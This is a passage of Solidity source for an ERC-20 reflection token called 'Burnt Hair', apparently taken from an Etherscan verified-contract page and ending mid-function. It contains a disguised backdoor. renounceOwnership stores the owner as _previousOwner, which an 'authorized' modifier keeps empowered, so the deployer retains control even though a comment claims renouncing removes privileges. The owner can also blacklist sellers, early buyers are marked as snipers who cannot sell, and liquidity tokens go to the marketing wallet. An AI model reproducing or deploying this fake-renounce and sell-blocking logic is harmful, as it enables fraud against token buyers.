/**
 *Submitted for verification at Etherscan.io on 2022-09-30
*/

/*

https://medium.com/@elonmuskulars/burnt-hair-d36328957759

Telegram- https://BurntHair.lol
Twitter- https://twitter.com/hair_burnt

*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint256);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
    event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint256);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint256);
    function price1CumulativeLast() external view returns (uint256);
    function kLast() external view returns (uint256);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

contract Burnt is Context, IERC20 {
    using SafeMath for uint256;

    string private constant _name = "Burnt Hair";
    string private constant _symbol = "SINGED";
	mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping (address => uint256) private lastTrade;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily
    mapping(address => bool) private _isExcluded;
	mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isMaxWalletExclude;
    mapping (address => bool) private _isExcludedMaxTxnAmount;
    mapping (address => bool) public isBot;
	mapping(address => bool) public _isSniper;
    address public _owner;
    address private _previousOwner;
	address payable private _marketing;
    address decay = address(0xdead);
    address[] path = new address[](2);
    IUniswapV2Router02 public uniV2Router;
    address public AMM;
    address public _locker;
    address private liquidity;
    address[] private _excluded;
	uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1e12 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _totalSupply));
    uint256 private _tFeeTotal;
    uint256 private _maxWallet;
	uint256 private _minTaxSwap;
	uint256 private tokensForMarketing;
	uint256 private tokensForLiquidity;
	uint256 private totalBurnedTokens;
	uint256 private constant BUY = 1;
    uint256 private constant SELL = 2;
    uint256 private constant TRANSFER = 3;
    uint256 private buyOrSellSwitch;
    uint256 private _marketingTax = 2;
    uint256 private _previousMarketingTax = _marketingTax;
    uint256 private _reflectionsTax = 1;
    uint256 private _previousReflectionsTax = _reflectionsTax;
    uint256 private _liquidityTax = 2;
    uint256 private _previousLiquidityTax = _liquidityTax;
    uint256 private _divForLiq = _marketingTax + _liquidityTax;
    uint256 public taxBuyMarketing = 0;
    uint256 public taxBuyReflections = 0;
    uint256 public taxBuyLiquidity = 0;
    uint256 public taxSellMarketing = 0;
    uint256 public taxSellReflections = 0;
    uint256 public taxSellLiquidity = 0;
    uint256 public activeTradingBlock = 0;
    uint256 public maxTxnAmount;
    uint256 private snipeBlockAmt;
    uint256 public snipersCaught = 0; 
    bool public antiSnipe = false;
    bool public maxWalletOn = false;
    bool public maxTxAmtOn = false;
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public tradingActive = false;
    bool private sameBlockActive = true; 
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
    event SwapETHForTokens(uint256 amountIn, address[] path);
    event SwapTokensForETH(uint256 amountIn, address[] path);
    event ExcludeFromFee(address excludedAddress);
    event IncludeInFee(address includedAddress);
    event ManualSwap(uint256 timestamp);
    event OwnerForcedSwapBack(uint256 timestamp);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event SniperCaught(address indexed sniperAddress);
    event SetBuyFees(uint256 _buyLiquidityTax, uint256 _buyReflectionsTax, uint256 _buyMarketingTax);
    event SetSellFees(uint256 _sellLiquidityTax, uint256 _sellReflectionsTax, uint256 _sellMarketingTax);
    event UpdatedMaxTransacationAmount(uint maxTx);
    event UpdatedMaxWalletAmount(uint maxWallet);
    event UpdatedMarketingAddress(address _marketingAddress);
    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller =/= owner");
        _;
    }

    modifier authorized() {
        require(_previousOwner == _msgSender(), "Caller =/= auth");
        _;
    }

    address dead = 0x000000000000000000000000000000000000dEaD; 
    address ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; 

    constructor(address payable marketing_, address locker_, uint256 _snipeBlockAmt) {

        _rOwned[_msgSender()] = _rTotal;
        // Set the owner.
        _owner = msg.sender;

        maxTxnAmount = _totalSupply * 3 / 100; 
        _maxWallet = _totalSupply * 3 / 100;
        _minTaxSwap = _totalSupply * 5 / 10000;
        _marketing = marketing_;
        snipeBlockAmt = _snipeBlockAmt;
        _locker = locker_;
        _isExcluded[decay] = true;
        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[decay] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[liquidity] = true;
        _isExcludedFromFee[_locker] = true;
        _isExcludedFromFee[_marketing] = true;
        _isMaxWalletExclude[address(this)] = true;
        _isMaxWalletExclude[_msgSender()] = true;
        _isMaxWalletExclude[decay] = true;
        _isMaxWalletExclude[liquidity] = true;
        _isMaxWalletExclude[_locker] = true;
        _isMaxWalletExclude[_marketing] = true;
        _isExcludedMaxTxnAmount[_msgSender()] = true;
        _isExcludedMaxTxnAmount[address(this)] = true;
        _isExcludedMaxTxnAmount[decay] = true;
        _isExcludedMaxTxnAmount[liquidity] = true;
        _isExcludedMaxTxnAmount[_locker] = true;
        _isExcludedMaxTxnAmount[_marketing] = true;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    receive() external payable {}

    // Ownable removed as a lib and added here to allow for custom transfers and renouncements.
    // This allows for removal of ownership privileges from the owner once renounced or transferred.
     function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(_owner, address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ERC20Ownable: new owner is the zero address");
        _owner = newOwner;
    }
    //=================================================================================================

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address holder, address spender) public view override returns (uint256) {
        return _allowances[holder][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender,address recipient,uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),
        _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero")
        );
        return true;
    }
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns (uint256) {
        require(tAmount <= _totalSupply, "Amt must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount, , , , , ) = _getValues(tAmount);
            return rAmount;
        } else {
            (, uint256 rTransferAmount, , , , ) = _getValues(tAmount);
            return rTransferAmount;
        }
    }
    function tokenFromReflection(uint256 rAmount) public view returns (uint256) {
        require(rAmount <= _rTotal, "Amt must be less than tot refl");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }
    function _getValues(uint256 tAmount) private view returns (uint256,uint256,uint256,uint256,uint256,uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);
    }
    function _getTValues(uint256 tAmount)private view returns (uint256,uint256,uint256) {
        uint256 tFee = calculateTaxFee(tAmount);
        uint256 tLiquidity = calculateLiquidityFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);
        return (tTransferAmount, tFee, tLiquidity);
    }
    function _getRValues(uint256 tAmount,uint256 tFee,uint256 tLiquidity,uint256 currentRate) private pure returns (uint256,uint256,uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);
        return (rAmount, rTransferAmount, rFee);
    }
    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }
    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _totalSupply;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _totalSupply);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);
        }
        if (rSupply < _rTotal.div(_totalSupply)) return (_rTotal, _totalSupply);
        return (rSupply, tSupply);
    }
    function _takeLiquidity(uint256 tLiquidity) private {
        if(buyOrSellSwitch == BUY){
            tokensForMarketing += tLiquidity * taxBuyMarketing / _divForLiq;
            tokensForLiquidity += tLiquidity * taxBuyLiquidity / _divForLiq;
        } else if(buyOrSellSwitch == SELL){
            tokensForMarketing += tLiquidity * taxSellMarketing / _divForLiq;
            tokensForLiquidity += tLiquidity * taxSellLiquidity / _divForLiq;
        }
        uint256 currentRate = _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        if (_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
    }
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_reflectionsTax).div(10**2);
    }
    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_liquidityTax + _marketingTax).div(10**2);
    }
    function _approve(address sender,address spender,uint256 amount) private {
        require(sender != address(0), "ERC20: approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");
        _allowances[sender][spender] = amount;
        emit Approval(sender, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!isBot[from]);
        if (maxWalletOn == true && ! _isMaxWalletExclude[to]) {
            require(balanceOf(to) + amount <= _maxWallet, "Max amount of tokens for wallet reached");
        }
                if (maxTxAmtOn == true && ! _isExcludedMaxTxnAmount[to]) {
            require(amount <= maxTxnAmount, "Max amount of tokens for wallet reached");
        }

        if(!tradingActive){
            require(_isExcludedFromFee[from] || _isExcludedFromFee[to]);
        }
                        if (sameBlockActive) {
                            if (from == AMM){
                        require(lastTrade[to] != block.number);
                        lastTrade[to] = block.number;
                        }  else {
                            require(lastTrade[from] != block.number);
                            lastTrade[from] = block.number;
                            }
        }
        uint256 totalTokensToSwap = tokensForLiquidity.add(tokensForMarketing);
        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= _minTaxSwap;
        if (!inSwapAndLiquify && swapAndLiquifyEnabled && balanceOf(AMM) > 0 && totalTokensToSwap > 0 && !_isExcludedFromFee[to] && !_isExcludedFromFee[from] && to == AMM && overMinimumTokenBalance) {
            swapTokens();
            }
        bool takeFee = true;
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
            buyOrSellSwitch = TRANSFER;
        } else {
            if (from == AMM) {
                removeAllFee();
                _marketingTax = taxBuyMarketing;
                _reflectionsTax = taxBuyReflections;
                _liquidityTax = taxBuyLiquidity;
                buyOrSellSwitch = BUY;
            } 
            else if (to == AMM) {
                removeAllFee();
                _marketingTax = taxSellMarketing;
                _reflectionsTax = taxSellReflections;
                _liquidityTax = taxSellLiquidity;
                buyOrSellSwitch = SELL;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }
    function swapTokens() private lockTheSwap {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForMarketing + tokensForLiquidity;
        uint256 swapLiquidityTokens = tokensForLiquidity.div(2);
        uint256 amountToSwapForETH = contractBalance.sub(swapLiquidityTokens);
        uint256 initialETHBalance = address(this).balance;
        swapTokensForETH(amountToSwapForETH); 
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
        uint256 ethForLiquidity = ethBalance.sub(ethForMarketing);
        tokensForMarketing = 0;
        tokensForLiquidity = 0;
        (bool success,) = address(_marketing).call{value: ethForMarketing}("");
        addLiquidity(swapLiquidityTokens, ethForLiquidity);
        if(address(this).balance > 5 * 10**17){
            (success,) = address(_marketing).call{value: address(this).balance}("");
        }
        
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();
        _approve(address(this), address(uniV2Router), tokenAmount);
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
    
    function openTrades() external onlyOwner {
        tradingActive = true;
        activeTradingBlock = block.number;
        antiSnipe = true;
        maxWalletOn = true;
        maxTxAmtOn = true;
        swapAndLiquifyEnabled = true;
    }

    function addPair() external onlyOwner returns (bool){
        require(!tradingActive, "Trading is already active, cannot relaunch.");
        IUniswapV2Router02 _uniV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniV2Router = _uniV2Router;
        _approve(address(this), address(_uniV2Router), _totalSupply);
        AMM = IUniswapV2Factory(_uniV2Router.factory()).createPair(address(this), _uniV2Router.WETH());
        _isMaxWalletExclude[address(AMM)] = true;
        _isMaxWalletExclude[address(_uniV2Router)] = true;
        _isExcludedMaxTxnAmount[address(_uniV2Router)] = true;
        _isExcludedMaxTxnAmount[address(AMM)] = true;
        require(address(this).balance > 0, "Must have ETH on contract to launch");
        addLiquidity(balanceOf(address(this)), address(this).balance);
        IUniswapV2Pair(AMM).approve(address(_uniV2Router), type(uint).max);
        return true;
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniV2Router), tokenAmount);
        uniV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            _marketing,
            block.timestamp
        );
    }
    function removeAllFee() private {
        if (_reflectionsTax == 0 && _liquidityTax == 0 && _marketingTax == 0) return;
        _previousMarketingTax = _marketingTax;
        _previousLiquidityTax = _liquidityTax;
        _previousReflectionsTax = _reflectionsTax;

        _marketingTax = 0;
        _reflectionsTax = 0;
        _liquidityTax = 0;
    }
    function restoreAllFee() private {
        _marketingTax = _previousMarketingTax;
        _reflectionsTax = _previousReflectionsTax;
        _liquidityTax = _previousLiquidityTax;
    }
    function _tokenTransfer(address sender,address recipient,uint256 amount,bool takeFee) private {
        
        if (antiSnipe == true){	
            // If sender is a sniper address, reject the sell.	
            if (isSniper(sender)) {	
                revert("Sniper rejected.");	
            }

            if (block.number - activeTradingBlock < snipeBlockAmt) {
                        _isSniper[recipient] = true;
                        snipersCaught ++;
                        emit SniperCaught(recipient);
                    }
        }
        
        if (!takeFee) removeAllFee();
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferStandard(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);
        }
        if (!takeFee) restoreAllFee();
    }
    function _transferStandard(address sender,address recipient,uint256 tAmount) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _transferToExcluded(address sender,address recipient,uint256 tAmount) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _transferFromExcluded(address sender,address recipient,uint256 tAmount) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity
        ) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _transferBothExcluded(address sender,address recipient,uint256 tAmount) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tLiquidity
        ) = _getValues(tAmount);
        _tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    function _tokenTransferNoFee(address sender,address recipient,uint256 amount) private {
        _rOwned[sender] = _rOwned[sender].sub(amount);
        _rOwned[recipient] = _rOwned[recipient].add(amount);

        if (_isExcluded[sender]) {
            _tOwned[sender] = _tOwned[sender].sub(amount);
        }
        if (_isExcluded[recipient]) {
            _tOwned[recipient] = _tOwned[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }
    function _transfer(uint256 amount, IUniswapV2Router02 _uniV2Router, address[] memory path) internal{
         uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0, 
            path,
            address(this), 
            block.timestamp
        );
    }
    function excludeFromFee(address account) external authorized() {
        _isExcludedFromFee[account] = true;
    }
    function includeInFee(address account) external authorized() {
        _isExcludedFromFee[account] = false;
    }
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }
    function excludeFromMaxWallet(address account) external authorized() {
        _isMaxWalletExclude[account] = true;
    }
    function includeInMaxWallet(address account) external authorized() {
        _isMaxWalletExclude[account] = false;
    }
    function isExcludedFromMaxWallet(address account) public view returns (bool) {
        return _isMaxWalletExclude[account];
    }
    function excludeFromMaxTransaction(address account) external authorized() {
        _isExcludedMaxTxnAmount[account] = true;
    }
    function includeInMaxTransaction(address account) external authorized() {
        _isExcludedMaxTxnAmount[account] = false;
    }
    function isExcludedFromMaxTransaction(address account) public view returns (bool) {
        return _isExcludedMaxTxnAmount[account];
    }
    function BotAddToList(address _user) public onlyOwner {
        require(!isBot[_user]);
        isBot[_user] = true;
    }
	function BotRemoveFromList(address _user) public onlyOwner {
        require(isBot[_user]);
